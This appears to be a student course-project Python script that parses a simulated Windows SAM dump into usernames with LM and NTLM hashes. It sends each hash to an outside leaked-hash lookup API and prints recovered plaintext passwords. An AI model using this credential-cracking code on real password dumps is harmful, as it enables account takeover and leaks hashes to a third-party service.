# Author: Thomas Jones
# Last Modified: 9/14/2015
# Written for python3 interpreter 
#
# MET CS 521 Information Structures in Python Project
#-------------------------------------------------------------------
# Will attempt to read Windows SAM file, parse the file, and launch
# a dictionary attack against the hashed credentials.
# NOTE: The development of a dictionary attack has not yet started.

# Loading Modules
import os.path
import requests

# Initial Values For Testing
SAM_TARGET_FILE = 'sam_test'  # sam test is a simulated file for testing

def read_and_parse_sam_file_lines(sam_filename):
    accounts = {}

    # if the file string sam_target is determined valid by os.path
    if os.path.isfile(sam_filename):

        # open the file identified by string SAM_TARGET_FILE as sam_file
        sam_file = open(sam_filename)

        # read in sam_file line by line
        for each_line in sam_file:
            users_hashes = []
            # start this line on a new line
            #print("READ IN: " + each_line, end='')

            # split line at each delimiting semicolon & assign
            sam_username = each_line.split(":")[0]
            sam_lm_hash = each_line.split(":")[2]
            sam_ntlm_hash = each_line.split(":")[3]

            users_hashes.append(sam_ntlm_hash)
            users_hashes.append(sam_lm_hash)
            accounts.update({sam_username:users_hashes})

            # output for testing
            #print(accounts)

        # close file after all lines have been handled
        sam_file.close()

    else:  # os.path determined that the file did not exist
        print("Error locating a file " + sam_filename)

    return accounts


def online_hash_lookup_by_leakedb_api(dictionary_accounts):
    # adopted from http://blog.abusix.com/2013/07/08/using-leakdb-for-compromised-password-hashes/
    # Requests dependency installed by $ sudo pip install requests
    #  resolve given hashes to plain text passwords: leakdb-hashes.py

    for key, value in dictionary_accounts.items():
        for hash_value in value:
            print(hash_value)
            #Use the j parameter for json output
            r = requests.get('https://api.leakdb.net/?j=%s' % hash_value)
            json = r.json()
            if json['found'] == 'true':
                print('plaintext for %s => %s' % (hash_value, json['hashes'][0]['plaintext']))
            else:
               print('plaintext for %s not found ' % (hash_value))


def main():
    credentials = read_and_parse_sam_file_lines(SAM_TARGET_FILE)
    online_hash_lookup_by_leakedb_api(credentials)
    return

if __name__ == "__main__":  # stops main execution if imported as module
    main()


# CITATIONS
# Learned to use a main function and protect against execution in modules from:
# Guido van Rossum blog in 2003
# https://www.artima.com/weblogs/viewpost.jsp?thread=4829
#
# Learned to use os.path for basic file verification from a StackOverflow thread:
# http://stackoverflow.com/questions/82831/check-whether-a-file-exists-using-python
#
# Example SAM file found online from KPMG Advisory N.V
# http://www.win.tue.nl/~aeb/linux/hh/Hackers_Hut_Windows_passwords.pdf
